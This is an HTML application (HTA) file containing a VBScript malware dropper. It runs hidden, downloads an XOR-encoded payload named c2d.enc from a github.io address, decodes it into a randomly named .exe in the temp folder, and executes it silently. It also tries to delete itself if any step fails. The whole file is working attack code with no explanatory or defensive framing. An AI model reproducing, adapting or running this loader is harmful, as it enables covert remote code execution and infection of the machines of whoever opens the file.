<html>
<head>
<hta:application id="o" applicationname="d" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
</head>
<body>
<script language="VBScript">
Set x = CreateObject("MSXML2.XMLHTTP.6.0")
If x Is Nothing Then Set x = CreateObject("MSXML2.XMLHTTP.3.0")
If x Is Nothing Then Set x = CreateObject("Microsoft.XMLHTTP")
If x Is Nothing Then MsgBox "FAIL: No XMLHTTP object": SelfDestruct
x.Open "GET", "https://kai195102.github.io/d/c2d.enc", False
x.Send
If x.Status <> 200 Then MsgBox "FAIL: HTTP " & x.Status: SelfDestruct
raw = x.ResponseBody
If VarType(raw) <> 8209 Then SelfDestruct
key = Array(&H3A, &H97, &H79, &HB0)
n = UBound(raw) : lb = LBound(raw)
ReDim dst(n - lb)
For i = lb To n
  dst(i - lb) = CByte(raw(i) Xor key(((i - lb) Mod 4)))
Next
Set fso = CreateObject("Scripting.FileSystemObject")
If fso Is Nothing Then SelfDestruct
tmp = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".exe"
Set stream = CreateObject("ADODB.Stream")
If stream Is Nothing Then SelfDestruct
stream.Type = 1
stream.Open
stream.Write dst
stream.SaveToFile tmp, 2
stream.Close
Set shell = CreateObject("WScript.Shell")
shell.Run tmp, 0, False
Sub SelfDestruct
  Set fso = CreateObject("Scripting.FileSystemObject")
  fso.DeleteFile WScript.ScriptFullName, True
  Self.Close
End Sub
</script>
</body>
</html>
